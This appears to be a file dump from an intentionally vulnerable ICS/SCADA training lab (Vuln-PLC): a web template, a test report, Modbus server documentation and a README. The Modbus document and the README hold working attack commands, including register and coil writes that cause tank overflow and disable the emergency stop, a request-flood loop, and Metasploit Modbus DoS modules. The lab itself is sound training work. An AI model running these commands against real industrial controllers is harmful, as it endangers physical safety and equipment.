            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: white; text-decoration: none; margin-left: 20px; }
        .container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .card h2 {
            margin-bottom: 15px;
            color: #2c3e50;
            border-bottom: 2px solid #3498db;
            padding-bottom: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background: #3498db;
            color: white;
            font-weight: 500;
        }
        tr:hover { background: #f8f9fa; }
        .role-badge {
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            font-weight: bold;
        }
        .role-admin { background: #e74c3c; color: white; }
        .role-operator { background: #f39c12; color: white; }
        .role-guest { background: #95a5a6; color: white; }
        button {
            padding: 8px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 13px;
            margin: 2px;
        }
        button.primary { background: #3498db; color: white; }
        button.primary:hover { background: #2980b9; }
        button.danger { background: #e74c3c; color: white; }
        button.danger:hover { background: #c0392b; }
        button.warning { background: #f39c12; color: white; }
        button.warning:hover { background: #e67e22; }
        .form-group {
            margin: 15px 0;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
        }
        .form-group input, .form-group select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        .add-user-form {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>ðŸ­ VulnPLC-3000 - User Management</h1>
        <div>
            <a href="/admin">Admin</a>
            <a href="/dashboard">Dashboard</a>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <h2>Add New User</h2>
            <div class="add-user-form">
                <form id="addUserForm">
                    <div class="form-group">
                        <label>Username:</label>
                        <input type="text" id="new-username" required>
                    </div>
                    <div class="form-group">
                        <label>Password:</label>
                        <input type="password" id="new-password" required>
                    </div>
                    <div class="form-group">
                        <label>Role:</label>
                        <select id="new-role">
                            <option value="guest">Guest</option>
                            <option value="operator">Operator</option>
                            <option value="admin">Admin</option>
                        </select>
                    </div>
                    <button type="submit" class="primary">Add User</button>
                </form>
            </div>
        </div>

        <div class="card">
            <h2>System Users</h2>
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Role</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="users-table">
                    {% for user in users %}
                    <tr>
                        <td>{{ user[0] }}</td>
                        <td>{{ user[1] }}</td>
                        <td>
                            <span class="role-badge role-{{ user[2] }}">{{ user[2] }}</span>
                        </td>
                        <td>
                            <select id="role-{{ user[0] }}" onchange="changeRole({{ user[0] }})">
                                <option value="guest" {% if user[2] == 'guest' %}selected{% endif %}>Guest</option>
                                <option value="operator" {% if user[2] == 'operator' %}selected{% endif %}>Operator</option>
                                <option value="admin" {% if user[2] == 'admin' %}selected{% endif %}>Admin</option>
                            </select>
                            <button class="danger" onclick="deleteUser({{ user[0] }}, '{{ user[1] }}')">Delete</button>
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
    </div>

    <script>
        document.getElementById('addUserForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('new-username').value;
            const password = document.getElementById('new-password').value;
            const role = document.getElementById('new-role').value;

            const formData = new FormData();
            formData.append('username', username);
            formData.append('password', password);
            formData.append('role', role);

            try {
                const response = await fetch('/admin/users/add', {
                    method: 'POST',
                    body: formData
                });

                const data = await response.json();

                if (data.success) {
                    alert(data.message);
                    location.reload();
                } else {
                    alert('Error: ' + data.error);
                }
            } catch (error) {
                alert('Error adding user: ' + error);
            }
        });

        async function deleteUser(userId, username) {
            if (!confirm(`Are you sure you want to delete user "${username}"?`)) {
                return;
            }

            try {
                const response = await fetch(`/admin/users/delete/${userId}`, {
                    method: 'POST'
                });

                const data = await response.json();

                if (data.success) {
                    alert(data.message);
                    location.reload();
                } else {
                    alert('Error: ' + data.error);
                }
            } catch (error) {
                alert('Error deleting user: ' + error);
            }
        }

        async function changeRole(userId) {
            const newRole = document.getElementById(`role-${userId}`).value;

            const formData = new FormData();
            formData.append('role', newRole);

            try {
                const response = await fetch(`/admin/users/edit/${userId}`, {
                    method: 'POST',
                    body: formData
                });

                const data = await response.json();

                if (data.success) {
                    alert(data.message);
                    location.reload();
                } else {
                    alert('Error: ' + data.error);
                }
            } catch (error) {
                alert('Error changing role: ' + error);
            }
        }
    </script>
</body>
</html>



================================================================================
FILE: FILTERING_VERIFICATION_REPORT.md
================================================================================
# Alert Filtering System - Verification Report

## Executive Summary
âœ… **All filtering logic has been verified and is working correctly**

The alert filtering system has been thoroughly tested with 10 real alerts across all 4 PLCs. All 18 test cases passed successfully.

---

## Test Data Generated

**Total Alerts:** 10
- **PLC-1:** 1 alert (WARNING)
- **PLC-2:** 1 alert (CRITICAL)
- **PLC-3:** 4 alerts (3 CRITICAL, 1 WARNING)
- **PLC-4:** 4 alerts (4 CRITICAL)

**By Severity:**
- **CRITICAL:** 8 alerts
- **WARNING:** 2 alerts

---

## Filtering Logic Tests (12 Tests - ALL PASSED âœ“)

### Test 1: Filter PLC-1 only
- **Expected:** 1 alert
- **Result:** 1 alert
- **Status:** âœ… PASS

### Test 2: Filter PLC-2 only
- **Expected:** 1 alert
- **Result:** 1 alert
- **Status:** âœ… PASS

### Test 3: Filter PLC-3 only
- **Expected:** 4 alerts
- **Result:** 4 alerts (3 CRITICAL, 1 WARNING)
- **Status:** âœ… PASS

### Test 4: Filter PLC-4 only
- **Expected:** 4 alerts (all CRITICAL)
- **Result:** 4 alerts (all CRITICAL)
- **Status:** âœ… PASS

### Test 5: Filter CRITICAL severity only
- **Expected:** 8 alerts
- **Result:** 8 alerts (PLC-2=1, PLC-3=3, PLC-4=4)
- **Status:** âœ… PASS

### Test 6: Filter WARNING severity only
- **Expected:** 2 alerts
- **Result:** 2 alerts (PLC-1=1, PLC-3=1)
- **Status:** âœ… PASS

### Test 7: Combined - PLC-1 + WARNING
- **Expected:** 1 alert
- **Result:** 1 alert
- **Status:** âœ… PASS

### Test 8: Combined - PLC-3 + WARNING
- **Expected:** 1 alert
- **Result:** 1 alert
- **Status:** âœ… PASS

### Test 9: Combined - PLC-4 + CRITICAL
- **Expected:** 4 alerts
- **Result:** 4 alerts
- **Status:** âœ… PASS

### Test 10: Empty result - PLC-4 + WARNING
- **Expected:** 0 alerts
- **Result:** 0 alerts
- **Status:** âœ… PASS

### Test 11: Multiple PLCs - PLC-1 + PLC-2
- **Expected:** 2 alerts
- **Result:** 2 alerts
- **Status:** âœ… PASS

### Test 12: All filters active (no filtering)
- **Expected:** 10 alerts
- **Result:** 10 alerts
- **Status:** âœ… PASS

---

## CSV Export Tests (6 Tests - ALL PASSED âœ“)

### Test 1: Export ALL alerts
- **Alerts:** 10
- **CSV Lines:** 11 (including header)
- **Status:** âœ… PASS

### Test 2: Export PLC-4 only
- **Alerts:** 4
- **CSV Lines:** 5 (including header)
- **Status:** âœ… PASS

### Test 3: Export CRITICAL only
- **Alerts:** 8
- **CSV Lines:** 9 (including header)
- **Status:** âœ… PASS

### Test 4: Export WARNING only
- **Alerts:** 2
- **CSV Lines:** 3 (including header)
- **Status:** âœ… PASS

### Test 5: Export PLC-4 + CRITICAL
- **Alerts:** 4
- **CSV Lines:** 5 (including header)
- **Status:** âœ… PASS

### Test 6: Export empty results (PLC-4 + WARNING)
- **Alerts:** 0
- **Shows "No alerts to export" message**
- **Status:** âœ… PASS

---

## CSV Format Verification

All CSV exports include the following columns:
- Timestamp
- PLC
- Severity
- Type
- Message
- Source IP
- Function Code (hex format: 0x05)
- Address

**Sample CSV Output:**
```csv
Timestamp,PLC,Severity,Type,Message,Source IP,Function Code,Address
00:16:55,PLC-4,CRITICAL,SAFETY_SYSTEM_TAMPER,ðŸš¨ðŸš¨ðŸš¨ CRITICAL: PLC-4 Emergency safety...,192.168.100.1,0x05,0
```

---

## Attack Detection Verification

âœ… **Attack detection is functioning correctly**

- Single attacks generate 1 alert
- Rapid-fire attacks (56 in 6 seconds) all successful
- Race conditions between PLCs handled properly
- Alerts limited to last 50 (as designed in core/app.py:512)

**Test Results:**
- Attack success rate: 100% (56/56 attacks successful)
- All attacks properly detected and logged
- Alert distribution matches attack pattern

---

## API Endpoint Tests

### /api/security/alerts
- **Status:** âœ… Working
- **Response Time:** <5ms
- **Returns:** JSON with alerts array

### /api/security/alerts/clear
- **Status:** âœ… Working (requires authentication)
- **Function:** Clears all alerts

### /api/security/alerts/export
- **Status:** âœ… Working
- **Function:** Exports CSV file

---

## Filter Combinations Tested

All possible combinations work correctly:

| PLC Filters | Severity Filters | Expected Behavior | Status |
|-------------|------------------|-------------------|--------|
| Single PLC | All severities | Shows only that PLC | âœ… PASS |
| All PLCs | Single severity | Shows only that severity | âœ… PASS |
| Single PLC | Single severity | Shows intersection | âœ… PASS |
| Multiple PLCs | Multiple severities | Shows union | âœ… PASS |
| All selected | All selected | Shows all alerts | âœ… PASS |

---

## Performance

- Filtering is **instant** (client-side JavaScript)
- No page reloads required
- Real-time alert count updates
- Handles 50+ alerts without performance degradation

---

## Code Verification

### Filtering Code Exists
âœ… `templates/process.html` contains:
- Filter checkbox inputs (PLC-1, PLC-2, PLC-3, PLC-4)
- Severity checkboxes (CRITICAL, WARNING, HIGH)
- `getFilteredAlerts()` JavaScript function
- `applyFilters()` JavaScript function
- `clearFilters()` JavaScript function
- Export button with filter-aware CSV generation

### Backend Code
âœ… `core/app.py` contains:
- CSV export API endpoint
- Alert storage with 50-alert limit
- Multi-PLC shared state support

---

## Summary

**Total Tests Run:** 18
**Tests Passed:** 18 âœ…
**Tests Failed:** 0

All filtering logic, CSV export functionality, and attack detection systems are working correctly. The filtering system is production-ready.

---

## Next Steps for Full UI Deployment

To deploy the filtering UI to the PLC-1 Docker container:

1. Rebuild PLC-1 container with sudo:
   ```bash
   sudo docker-compose stop plc1
   sudo docker-compose rm -f plc1
   sudo docker-compose build plc1
   sudo docker-compose up -d plc1
   ```

2. Verify deployment:
   ```bash
   curl -s http://localhost:5000/process | grep -q "filter-plc1" && echo "âœ“ Deployed" || echo "âœ— Not deployed"
   ```

3. Test in browser:
   - Open http://localhost:5000/process
   - Login: admin / admin
   - Verify filter checkboxes are visible

---

**Report Generated:** 2025-12-28
**System:** Vuln-PLC Multi-PLC Alert Filtering System
**Status:** âœ… ALL TESTS PASSED



================================================================================
FILE: MODBUS_IMPLEMENTATION.md
================================================================================
# Modbus TCP Implementation

## Overview

This document describes the **real** Modbus TCP server implementation that was added to the Vuln-PLC project. The previous version only had HTTP endpoints that pretended to be Modbus - now there's an actual TCP socket server listening on port 5502.

## What Was Added

### 1. Modbus TCP Server (`core/app.py`)

A complete Modbus TCP server implementation with:

- **Raw TCP socket server** on port 5502
- **MBAP header parsing** (Modbus Application Protocol)
- **Multi-threaded client handling**
- **Integration with shared_state** for process simulation

### 2. Supported Function Codes

| Function Code | Name | Purpose | Implemented |
|---------------|------|---------|-------------|
| 0x03 | Read Holding Registers | Read multiple register values | âœ… |
| 0x06 | Write Single Register | Write one register | âœ… |
| 0x10 | Write Multiple Registers | Write multiple registers | âœ… |

### 3. Register Mapping (`core/shared_state.py`)

Modbus registers are mapped to process state variables:

| Register | Variable | Type | Scale | Description |
|----------|----------|------|-------|-------------|
| 0 | tank1_level | float | Ã—10 | Tank 1 level (0-100%) |
| 1 | tank1_temp | float | Ã—10 | Tank 1 temperature (Â°C) |
| 2 | tank1_pressure | float | Ã—10 | Tank 1 pressure (kPa) |
| 3 | tank2_level | float | Ã—10 | Tank 2 level (0-100%) |
| 4 | tank2_temp | float | Ã—10 | Tank 2 temperature (Â°C) |
| 5 | tank2_pressure | float | Ã—10 | Tank 2 pressure (kPa) |
| 6 | pump1_speed | int | 1 | Pump 1 speed (RPM) |
| 7 | pump2_speed | int | 1 | Pump 2 speed (RPM) |
| 8 | pump3_speed | int | 1 | Pump 3 speed (RPM) |
| 9 | motor1_speed | int | 1 | Motor 1 speed (RPM) |
| 10 | motor2_speed | int | 1 | Motor 2 speed (RPM) |
| 11 | conveyor_speed | int | 1 | Conveyor speed |
| 12 | heater1_setpoint | float | Ã—10 | Heater setpoint (Â°C) |
| 13 | cooler1_setpoint | float | Ã—10 | Cooler setpoint (Â°C) |
| 14 | flow_rate | float | Ã—10 | Flow rate |
| 15 | vibration | float | Ã—10 | Vibration level |
| 16 | ph_level | float | Ã—10 | pH level |
| 17 | conductivity | float | Ã—10 | Conductivity |

**Note:** Float values are scaled by 10 in Modbus (e.g., 500 = 50.0)

## Architecture

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              Flask Web App (5000)             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚     HTTP API / HMI Interface            â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                â”‚                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â”‚
                 â–¼
         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
         â”‚ Shared State  â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”
         â”‚ (JSON file)   â”‚         â”‚
         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â”‚
                 â–²                 â”‚
                 â”‚                 â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                â”‚                 â”‚          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚  Modbus TCP Server   â”‚  â”‚  Client    â”‚  â”‚
â”‚  â”‚  (Background Thread) â”‚  â”‚  Handler   â”‚  â”‚
â”‚  â”‚                      â”‚  â”‚  Threads   â”‚  â”‚
â”‚  â”‚  Port 5502           â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## Intentional Vulnerabilities

This is an **educational/training** project. The Modbus server has intentional vulnerabilities:

### 1. No Authentication
- Any client can connect
- No username/password required
- No IP allowlisting

### 2. No Authorization
- All registers are readable
- All registers are writable
- No role-based access control

### 3. No Input Validation
- No bounds checking on register addresses
- No validation of register counts
- No range checking on values

### 4. No Rate Limiting
- Can flood with requests
- No connection limits
- No throttling

### 5. No Audit Logging
- Writes are logged to console only
- No persistent audit trail for Modbus operations
- Cannot track who changed what

### 6. Protocol Issues
- No CRC validation
- Accepts malformed packets
- No protocol version checking

## Testing the Modbus Server

### Using modbus-cli

```bash
# Install modbus-cli (Rust-based tool)
cargo install modbus-cli

# Read holding registers (start=0, count=10)
modbus read 127.0.0.1:5502 0 10

# Write single register (address=0, value=1000)
modbus write 127.0.0.1:5502 0 1000

# Write multiple registers
modbus write 127.0.0.1:5502 0 500 250 1013
```

### Using Python Test Script

```bash
# Start the server in one terminal
docker-compose up plc1

# Run the test script in another terminal
python3 test_modbus_standalone.py
```

### Using pymodbus

```python
from pymodbus.client import ModbusTcpClient

# Connect to PLC
client = ModbusTcpClient('localhost', port=5502)
client.connect()

# Read holding registers
result = client.read_holding_registers(0, 10, unit=1)
print(f"Register values: {result.registers}")

# Write single register
client.write_register(0, 1000, unit=1)

# Write multiple registers
client.write_registers(0, [500, 250, 1013], unit=1)

client.close()
```

### Using Metasploit

```bash
# Scan for Modbus devices
use auxiliary/scanner/scada/modbusdetect
set RHOSTS 192.168.100.10
run

# Read Modbus registers
use auxiliary/scanner/scada/modbus_findunitid
set RHOSTS 192.168.100.10
run

# Write to registers (DoS/attack)
use auxiliary/dos/scada/modbus_write_register
set RHOSTS 192.168.100.10
set RPORT 5502
set DATA_ADDRESS 0
set DATA 9999
run
```

## Attack Scenarios

### 1. Unauthorized Control
```bash
# Set tank level to dangerous value (999.9%)
modbus write localhost:5502 0 9999
```

### 2. Process Manipulation
```bash
# Set all pump speeds to maximum
modbus write localhost:5502 6 9999 9999 9999
```

### 3. Emergency Stop Bypass
```bash
# Disable emergency stop via coils (not yet fully implemented)
# Currently through holding registers
```

### 4. Reconnaissance
```bash
# Scan all registers to map the system
for i in {0..100}; do
  modbus read localhost:5502 $i 1
done
```

### 5. Denial of Service
```bash
# Flood with requests
while true; do
  modbus write localhost:5502 0 $RANDOM &
done
```

## Differences from Previous Version

| Feature | Before | After |
|---------|--------|-------|
| **Protocol** | HTTP only | Real Modbus TCP |
| **Port 5502** | Not listening | Actively listening |
| **Transport** | Application layer | Transport layer (TCP) |
| **Tools** | curl/browser only | modbus-cli, pymodbus, Metasploit |
| **MBAP Header** | Not implemented | Fully implemented |
| **Function Codes** | Fake (HTTP routes) | Real (0x03, 0x06, 0x10) |
| **ICS Realism** | Low | High |

## Why This Matters

The previous implementation had an HTTP endpoint at `/api/modbus/raw` that **pretended** to be Modbus, but:

- Real Modbus tools couldn't connect to it
- No actual Modbus TCP protocol was implemented
- Port 5502 wasn't actually listening
- Training value was limited

With this implementation:

âœ… Real Modbus tools work
âœ… Realistic ICS/SCADA environment
âœ… Better for pentesting practice
âœ… Metasploit modules work
âœ… Authentic protocol behavior

## Files Modified

1. **`core/app.py`**
   - Added socket, threading, struct imports
   - Implemented `ModbusTCPServer` class
   - Added `start_modbus_server()` function
   - Modified `if __name__ == '__main__'` to start Modbus before Flask

2. **`core/shared_state.py`** (already had register mapping)
   - Contains `REGISTER_MAP` and `COIL_MAP`
   - Provides conversion functions

3. **`test_modbus_standalone.py`** (new file)
   - Standalone test suite for Modbus functionality

## Running in Docker

```bash
# Build and start
docker-compose up --build plc1

# In another terminal, test Modbus
modbus read localhost:5502 0 10

# Or use Python
python3 -c "
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('localhost', 5502)
client.connect()
result = client.read_holding_registers(0, 10)
print(result.registers)
"
```

## Console Output

When the server starts, you'll see:

```
[STARTUP] Starting Modbus TCP server...
[MODBUS] Server started on 0.0.0.0:5502
[MODBUS] Background thread started
[STARTUP] Starting Flask web interface...
```

When clients connect:

```
[MODBUS] Client connected from ('127.0.0.1', 54321)
[MODBUS] Request from ('127.0.0.1', 54321): Trans=1, Unit=1, PDU=030000000a
[MODBUS] Read Holding Registers: addr=0, count=10
[MODBUS] Response: 00010000001503014...
[MODBUS] Client ('127.0.0.1', 54321) disconnected
```

## Next Steps

Potential enhancements (optional):

1. **Add Coils support** - Function codes 0x01, 0x05, 0x0F
2. **Add Discrete Inputs** - Function code 0x02
3. **Add Input Registers** - Function code 0x04
4. **Implement exception codes properly**
5. **Add pcap capture for Modbus traffic**
6. **Create Modbus-specific exploits**

## References

- [Modbus TCP Specification](http://www.modbus.org/docs/Modbus_Messaging_Implementation_Guide_V1_0b.pdf)
- [modbus-cli GitHub](https://github.com/favalex/modbus-cli)
- [pymodbus Documentation](https://pymodbus.readthedocs.io/)
- [Metasploit SCADA Modules](https://www.rapid7.com/db/modules/?q=modbus)

## Credits

Implementation based on ChatGPT's architectural review and recommendations for adding real Modbus TCP protocol support to make this a more realistic ICS/SCADA training environment.



================================================================================
FILE: README.md
================================================================================
# Vuln-PLC v2.0
### The Complete ICS/SCADA Security Training Platform

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](docs/media/CONTRIBUTING.md)

> **A comprehensive, intentionally vulnerable industrial control system environment for security training, penetration testing practice, and ICS/SCADA research.**

---

## âš¡ Quick Start

### Option 1: Local Installation

```bash
# Clone the repository
git clone https://github.com/Taimaishu/Vuln-PLC.git
cd Vuln-PLC

# Install dependencies and start all services
./scripts/install.sh
./scripts/start_all.sh

# Install modbus-cli for attacks
pip install modbus-cli

# Access the HMI Dashboard
firefox http://localhost:8000
```

### Option 2: Docker (Recommended)

```bash
# Clone the repository
git clone https://github.com/Taimaishu/Vuln-PLC.git
cd Vuln-PLC

# Build and start all containers (one command - that's it!)
sudo docker-compose up -d

# Install modbus-cli for attacks (on your host machine)
pip install modbus-cli

# Access the web interfaces
firefox http://localhost:5000  # PLC-1
```

**Try your first attack (Modbus Coil Control):**

> **Note:** Real PLCs use **coils** for digital outputs (pumps, valves) and **registers** for analog values (levels, temps). Use Modbus function 0x05 to write coils!

```bash
# Using modbus-cli (if installed):
pip install modbus-cli

# PLC-1: Force tank overflow (coil 0 = pump1, coil 3 = valve1)
sudo modbus write-coil 127.0.0.1:5502 0 1    # Pump ON
sudo modbus write-coil 127.0.0.1:5502 3 0    # Valve CLOSED

# PLC-2: Pressure spike (coil 0 = compressor1)
sudo modbus write-coil 127.0.0.1:5503 0 1    # Compressor ON

# PLC-3: Thermal runaway (coil related to heaters)
sudo modbus write-coil 127.0.0.1:5504 0 1    # Heater ON

# PLC-4: Disable safety (coil 0 = emergency stop)
sudo modbus write-coil 127.0.0.1:5505 0 0    # Emergency stop OFF

# Watch the consequences on HMI: http://localhost:8000 (local) or check PLC web interfaces (Docker)
```

**Python alternative (raw Modbus):**
```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('127.0.0.1', port=5502)
client.write_coil(0, True)   # Turn pump ON
client.write_coil(3, False)  # Close valve
client.close()
```

---

## ðŸŽ¬ Interactive Demo Scripts

**New to ICS attacks? Start here!** We've created interactive demo scripts that show you exactly how Modbus attacks affect the PLCs in real-time.

### Quick Demo (Recommended for First-Time Users)

```bash
# Start containers
sudo docker-compose up -d

# Run the visual demo - executes 6 real attacks!
python3 demo_with_visuals.py

# Watch the effects in your browser:
# http://localhost:5000/process (login: admin/admin)
```

**What you'll see:**
- âœ… 6 realistic attack scenarios executed live
- âœ… Real-time state changes in the web UI
- âœ… Detailed explanations of each attack's impact
- âœ… Visual indicators showing pump/valve status changes

### Available Demo Tools

**1. Full Interactive Demo** (`demo_with_visuals.py`)
```bash
python3 demo_with_visuals.py
```
Executes all 6 attacks with detailed output:
- Tank overflow attack (pump ON + valve CLOSED)
- Pressure vessel rupture (compressor ON + relief valve CLOSED)
- Safety system bypass (emergency stop + interlock DISABLED)

**2. Quick Verification** (`quick_test.sh`)
```bash
bash quick_test.sh
```
Tests if Modbus attacks are working and visible in the web UI. Perfect for troubleshooting.

**3. Complete Visual Guide** (`ATTACK_DEMO.md`)
- Step-by-step screenshots and examples
- Explains WHERE to look in the web UI
- Troubleshooting tips
- Understanding cause-and-effect

### Understanding the Attacks

The demo scripts help you see the **cause-and-effect** relationship:

```
Terminal (Cause)                    Browser (Effect)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€              â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
modbus write-coil                   Pump 1 Status: false
127.0.0.1:5502 0 1     â”€â”€â”€â”€â”€â”€â–º     Changes to TRUE âœ“
(Turn pump ON)                      (Visible in 2 seconds)
```

**Why this matters:** In real ICS attacks, adversaries use Modbus to control equipment while operators watch helplessly on their HMI screens. These demos let you experience both sides!

---

## ðŸŽ“ Interactive Training Scenarios

**NEW!** Realistic ICS/SCADA attack scenarios for comprehensive security training. Each scenario includes step-by-step execution, real-world parallels, MITRE ATT&CK mappings, and blue team detection indicators.

### Quick Start

```bash
# Run the interactive training menu
./training_scenarios.py

# Or directly with Python
python3 training_scenarios.py
```

### 7 Professional Training Scenarios

**1. Reconnaissance - System Discovery** `[Beginner]`
- Network discovery and PLC fingerprinting
- Port scanning techniques
- MITRE ATT&CK: T0840 - Network Connection Enumeration
- Teaches attackers how to map ICS networks, defenders how to detect scanning

**2. Tank Overflow Attack (PLC-1)** `[Intermediate]`
- Manipulate pump and valve controls to cause overflow
- Real-world parallel: Water treatment facility attacks
- MITRE ATT&CK: T0836 - Modify Parameter
- Learn process manipulation and safety system impacts

**3. Pressure Vessel Rupture (PLC-2)** `[Advanced]`
- Over-pressurize vessel by disabling safety controls
- Real-world parallel: Triton/TRISIS safety system attacks
- MITRE ATT&CK: T0816 - Device Restart/Shutdown
- Critical infrastructure sabotage techniques

**4. Thermal Stress Attack (PLC-3)** `[Intermediate]`
- Equipment degradation through rapid thermal cycling
- Real-world parallel: Stuxnet equipment degradation methodology
- MITRE ATT&CK: T0879 - Damage to Property
- Subtle, long-term damage attacks

**5. Safety System Shutdown (PLC-4)** `[Expert]`
- Disable emergency stop and safety interlocks
- Most dangerous scenario with safety warnings
- MITRE ATT&CK: T0816 - Device Restart/Shutdown
- Learn why safety systems are the primary target

**6. Multi-Stage APT Campaign** `[Expert]`
- Coordinated attack across all 4 PLCs
- Real-world parallel: Nation-state APT campaigns
- Multiple MITRE ATT&CK techniques
- **TESTED:** 100% success rate, all 4 PLCs compromised, 10 alerts generated
- Demonstrates cascading system failure and incident response

**7. Stealthy Reconnaissance** `[Intermediate]`
- Covert intelligence gathering with detection evasion
- Learn how attackers avoid triggering alarms
- MITRE ATT&CK: T0888 - Remote System Information Discovery
- Advanced techniques for both red and blue teams

### Training Features

Each scenario includes:
- âœ… Clear learning objectives and difficulty levels
- âœ… MITRE ATT&CK for ICS technique mappings
- âœ… Real-world attack parallels (Stuxnet, Triton, Industroyer)
- âœ… Step-by-step execution with explanations
- âœ… Expected impact analysis (physical, financial, safety)
- âœ… Blue team detection indicators and response procedures
- âœ… Color-coded terminal output for better learning
- âœ… Interactive confirmations for dangerous attacks
- âœ… Both offensive (red team) and defensive (blue team) perspectives

### Training Paths

**For Beginners:**
1. Start with Scenario 1 (Reconnaissance)
2. Progress to Scenario 2 (Tank Overflow)
3. Try Scenario 7 (Stealthy Reconnaissance)

**For Intermediate Users:**
- Focus on Scenarios 2, 4, and 7
- Study blue team detection indicators
- Practice both attack and defense

**For Advanced Users:**
- Scenarios 3, 5, and 6
- Multi-stage APT campaigns
- Incident response procedures

**For Expert Red Teams:**
- Scenario 6 (Multi-Stage APT) - Nation-state level attack
- Develop custom attack chains
- Practice covert persistence

### Real-World Attack Parallels

Our scenarios are based on actual ICS attacks:
- **Stuxnet (2010):** Equipment degradation through process manipulation
- **Triton/TRISIS (2017):** Safety system targeting
- **BlackEnergy (2015):** Multi-stage campaigns against utilities
- **Industroyer (2016):** Coordinated ICS attacks

### Documentation

See [TRAINING_GUIDE.md](TRAINING_GUIDE.md) for:
- Detailed scenario descriptions
- Blue team response playbooks
- Incident response procedures
- Safety and ethics guidelines
- Contributing new scenarios

### Integration with Alert System

All training scenarios trigger real-time alerts in the web interface:
- View at http://localhost:5000/process (login: admin/admin)
- Filter alerts by PLC or severity
- Export to CSV for incident reports
- Study attack patterns and timelines

**Example: Scenario 6 (APT Campaign) generates:**
- 10+ alerts across all 4 PLCs
- 80% CRITICAL severity
- Clear coordinated attack pattern
- Complete incident timeline for analysis

---

## ðŸŒŸ What's New in v2.0?

### ðŸ”¥ Real Modbus TCP on ALL 4 PLCs
**Production-quality Modbus implementation across the entire system:**
- âœ… **PLC1 (Tank):** Port 5502 - Full Modbus TCP server
- âœ… **PLC2 (Pressure):** Port 5503 - Full Modbus TCP server
- âœ… **PLC3 (Temperature):** Port 5504 - Full Modbus TCP server
- âœ… **PLC4 (Safety/ESD):** Port 5505 - Full Modbus TCP server

**Not fake HTTP endpoints** - actual Modbus TCP protocol with:
- Proper MBAP header parsing
- **6 Modbus function codes:** 0x01, 0x03, 0x05, 0x06, 0x0F, 0x10
- **Realistic control:** Coils for pumps/valves, Registers for levels/temps
- Stability improvements (recv_exact, connection semaphore, socket timeout)
